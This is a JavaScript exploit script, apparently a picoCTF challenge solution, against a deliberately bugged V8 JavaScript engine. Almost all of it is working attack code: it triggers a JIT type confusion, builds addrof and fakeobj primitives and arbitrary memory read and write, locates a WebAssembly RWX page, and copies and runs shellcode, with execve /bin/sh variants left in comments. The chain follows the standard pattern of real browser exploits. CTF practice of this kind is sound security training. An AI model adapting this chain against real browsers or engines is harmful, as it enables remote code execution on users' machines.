/// Helper functions to convert between float and integer primitives
buf = new ArrayBuffer(8); // 8 byte array buffer
f64_buf = new Float64Array(buf);
u64_buf = new Uint32Array(buf);

// convert float to integer
let ftoi = (val) => { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

// convert integer to float
let itof = (val) => { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

let toHex = (val) => "0x" + ftoi(val).toString(16);

// dirty version of itof 
let itof_dirty = (val, length) => {
    // used to overwrite elements with our desired length
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(length*2);    // smi
    return f64_buf[0];
}

float_arr = [1.1, 1.2, 1.3];
obj_arr = [{"A": 1}, {"B": 2}, {"C":3}];

// trigger jit compiler bug
let jitme_read = (arr, idx) => {
    // avoid inline
    for (var i=0;i<10;i++) 
        i += 0;

    return arr[idx];
}

let jitme_write = (arr, idx, val) => {
    // avoid inline
    for (var i=0;i<10;i++)
        i += 0;
    
    arr[idx] = val;
}

// jit
for (var i=0;i<100000;i++) {
    var float_arr = [1.1, 1.2];
    var obj_arr = [{a: 1}, {b: 2}];
    jitme_read(float_arr, 0);
    jitme_write(float_arr, 0, 1.3);
    // jitme_write_obj(obj_arr, 0, {c: 3});
}


let addrof = (obj) => {
    var obj_arr = [obj, obj];

    return jitme_read(obj_arr, 0); 
}

let fakeobj = (addr) => {
    var obj_arr = [{a: 1}, {b: 1}];
    jitme_write(obj_arr, 0, addr);

    return obj_arr[0];
}

// because of pointer compression, float numbers stored in 64bit but object stored in 32 bit
// let arb_rw_arr is an object array of size 2, since we abuse a type confusion bug and make jit think its a float array of size 2
// => if we read index 1 of float array => we get an oob read in object array 
// => leak obj_arr_map because the nature of object structure in javascript
// with the obj_arr_map, we can calculate the float_arr_map by sub to 0x50n
tmp = {x:1};
let arb_rw_arr = [tmp, tmp];  
let f_arr = [1.1, 1.2];
let leak_float_arr_map = itof(ftoi(jitme_read(arb_rw_arr, 1)) - 0x50n);
console.log(toHex(leak_float_arr_map));

let arb_read = (addr, idx) => {
    // fake obj is at elements of tmp_arr
    let tmp_arr = [leak_float_arr_map, 0.2, 0.3, 0.4];

    tmp_arr[1] = itof_dirty(ftoi(addr) - 0x8n, 0x10);  // put address we wanna read to elements of fake obj

    let obj = fakeobj(itof(ftoi(addrof(tmp_arr)) - 0x20n));

    return obj[idx];

}

let arb_write = (addr, val) => {
    // fake obj is at elements of tmp_arr
    let tmp_arr = [leak_float_arr_map, 0.2, 0.3, 0.4];

    tmp_arr[1] = itof_dirty(ftoi(addr) - 0x8n, 0x10);  // put address we wanna read to elements of fake obj

    let obj = fakeobj(itof(ftoi(addrof(tmp_arr)) - 0x20n)); 

    obj[0] = val;
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
var wasm_instance_addr = addrof(wasm_instance);
var rwx = arb_read(itof(ftoi(wasm_instance_addr) + 0x68n), 0);

console.log("[+} wasm instance at 0x" + ftoi(wasm_instance_addr).toString(16));
console.log("rwx: 0x" + toHex(rwx));
// shellcode = [0x48, 0xC7, 0xC0, 0x3B, 0x00, 0x00, 0x00, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2, 0x48, 0xB9, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x51, 0x48, 0x89, 0xE7, 0x0F, 0x05]
// shellcode = [0x747868, 0x2eb84800, 0x616c662f, 0x50742e67, 0x6ae78948, 0x6a5e00, 0x58026a5a, 0x8948050f, 0xe68948c7, 0x6a5a646a, 0x50f5800, 0x6a5f016a, 0x50f5801]

shellcode = [16889928,16843009,1213202689,1652108984,23227744,70338561,800606244,796029813,1349413218,1760004424,16855099,19149953,1208025345,1397310648,1497451600,3526447165,1510500946,1390543176,1222805832,16843192,16843009,3091746817,1617066286,16867949,604254536,1966061640,1647276659,827354729,141186806,3858843742,3867756630,257440618,2425393157];
//var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
// var shellcode =[3091756138, 1634493999, 2020879975, 1476553296, 837257544, 1090850806, 4294967226, 3330885759, 1784162410, 261709569, 5];
var buf = new ArrayBuffer(0x100);
var dataview = new DataView(buf);
var buf_addr = ftoi(addrof(buf));
var backing_addr = buf_addr + 0x14n;

console.log('[+] Writing over ArrayBuffer backing store at: ' + (backing_addr).toString(16));
arb_write(itof(backing_addr), rwx);

console.log("[+] Copying shellcode...")
for (let i = 0; i < shellcode.length; i++) {
    dataview.setUint32(i*4, shellcode[i], true);
}
f();

// picoCTF{Good_job!_Now_go_find_a_real_v8_cve!_be6ab909622dd072}
